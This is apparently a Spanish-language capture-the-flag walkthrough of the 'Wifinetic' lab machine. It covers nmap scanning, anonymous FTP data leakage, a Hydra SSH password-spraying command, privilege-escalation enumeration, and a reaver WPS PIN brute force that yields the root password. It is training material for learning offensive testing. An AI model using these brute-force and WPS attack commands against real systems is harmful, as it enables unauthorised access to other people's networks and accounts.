# Wifinetic 
<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/Wifinetic.png" alt="Wifinetic" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li>FTP Enumeration</li>
        <li>Information leakage</li>
        <li>SSH Brute Force with Hydra</li>
        <li>Abusing Capabilities-Reaver</li>
        <li>Abusing an AP's WPS to get the root password [Privilege Escalation]</li>
        <li>Trying to change the password and showing how the WPS Pin is still giving the new password</li>
      </ul>
    </td>
  </tr>
</table>

## Reconocimiento inicial
Realizamos un escaneo de todos los puertos para comprobar cuáles estan abiertos y lo exportamos al fichero `allports` 

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.247 -oG allports
```

```shell
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63

```

Vamos a realizar un escaneo más exaustivo de los siguiente puertos encontrados:


```shell
nmap -sCV -p21,22,53 10.10.11.247 -oN targeted
```

```shell
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.47
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)

```

Como se puede apreciar encontramos diferente contenido interesante sobretodo en el puerto `ftp` en este servicio nos podemos auntenticar con usuario `anonymous`
y podemos descargar los ficheros que encontramos.

## Investigación de los archivos que encontramos.
Tras hacer una pequeña investigación de los archivos que encontramos he recogido varios ususarios interesante que puede usarse para hacer un diccionario de usuarios para probarlos.

Estos ususarios han sido descubiertos tanto en los diferentes `pdf`como en el archivo passwd del vackup que había.

```
samantha.wood93
swood93
samantha
management
olivia.walker17
oliviawalker
olivia
owalker17
oliver
netadmin
ubus
logd
dnsmasq
ntp
```

Examinando los demás ficheros encontramos uno en el siguiente directorio `config/wireless` con la siguiente posible contraseña.

```
option key 'VeRyUniUqWiFIPasswrd1!'
```

## Intrusión 

Voy a realizar un ataque contra el servicio ssh usando la herramienta `hydra` usando la contraseña que hemos encontrado anteriormente.

```shell
hydra -L users.txt -p 'VeRyUniUqWiFIPasswrd1!' -t4 ssh://10.10.11.247
```
Encontramos el siguiente usuario y contraseña.

```shell
host: 10.10.11.247   login: netadmin   password: VeRyUniUqWiFIPasswrd1!
```
Accedemos al servicio ssh con estas credenciales .

De esta manera ya tendremos una terminal totalmente interactiva además de que podemos ir al directorio `/home` y ver la flag de user.txt


## Escalada de privilegios

Como he realizado otras veces compruebo las diferentes formas de escalar privilegios.

Compruebo si puedo exzplotar algun binario abusando del SUID y que el propietario sea root 

```shell
find / -perm -4000 -user root 2>/dev/null | xargs ls -l
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
```
Comprobamos las capabilities:

```shell
getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

nos encontramos una capability interesante `reaver`

## ¿Qué es Reaver?
Reaver realiza un ataque de fuerza bruta contra el número PIN de Wi-Fi Protected Setup de un punto de acceso. Una vez encontrado el PIN WPS, se puede recuperar el WPA PSK y, alternativamente, se pueden reconfigurar los ajustes inalámbricos del AP. Este paquete también proporciona el ejecutable Wash, una utilidad para identificar puntos de acceso habilitados para WPS.

## Obtenemos la contraseña 
Comprobamos que esta instalado:
```shell
which reaver
/usr/bin/reaver
```

Vemos como si hacemos `ifconfig` para ver las interfaces os encontramos con una `mon0`en modo monitor justamente para usar con esta herramienta.

Si ejecutamos el siguiente comando
```shell
iw dev
```

Nos encontramos un esquema de como esta montado la red además de ver una interfaz `wlan0` que simula un punto de acceso. 
Por otor lado vemos una interfaz`wlan1` que parece ser un cliente y se encuentra conectado a esta punto de acceso.

Viendo como se utiliza esta herramienta vemos que necesitamos la MAC del punto de eacceso.por lo tnato :

```shell
reaver -i mon0 -b 02:00:00:00:00:00 -vv
```
Vemos que lanza el pin `12345670` y es correcto de forma que nos devuelve la contraseña en texto claro `WhatIsRealAnDWhAtIsNot51121!`

```shell
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.

```

Finalmente con esta contraseña obtenemos acceso a root usando esa contraseña para conectarnos con `ssh`